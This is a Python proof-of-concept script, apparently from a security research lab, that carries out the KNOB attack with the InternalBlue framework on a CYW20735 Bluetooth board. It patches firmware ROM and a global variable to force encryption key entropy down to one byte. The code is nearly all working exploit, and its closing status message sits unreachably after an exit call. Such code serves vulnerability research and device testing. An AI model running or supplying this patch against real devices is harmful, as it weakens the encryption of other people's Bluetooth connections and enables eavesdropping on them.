#!/usr/bin/env python3

# Jiska Classen, Secure Mobile Networking Lab
from internalblue import Address
from internalblue.hcicore import HCICore
from internalblue.utils.pwnlib_wrapper import log, asm


"""
This is a standalone PoC for the KNOB attack on a CYW20735 evaluation board.

Original LMP monitor mode was from Dennis Mantz, and was then modified by Daniele Antonioli for KNOB.
For details see https://github.com/francozappa/knob

This PoC is much shorter since it only modifies global variables for key entropy.

"""


internalblue = HCICore()
internalblue.interface = internalblue.device_list()[0][1] # just use the first device

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)


log.info("Installing patch which ensures that send_LMP_encryptoin_key_size_req is always len=1!")

# modify function lm_SendLmpEncryptKeySizeReq
patch = asm("mov r2, #0x1", vma=0x7402A)  # connection struct key entropy
internalblue.patchRom(Address(0x7402A), patch)

# modify global variable for own setting
internalblue.writeMem(0x280F13, b'\x01')  # global key entropy


internalblue.shutdown()
exit(-1)
log.info("-----------------------\n"
         "Installed KNOB PoC. If connections to other devices succeed, they are vulnerable to KNOB.\n"
         "Monitoring device behavior is a bit tricky on Linux, LMP messages might appear in btmon.\n"
         "For more details, see special instructions for BlueZ.\n")


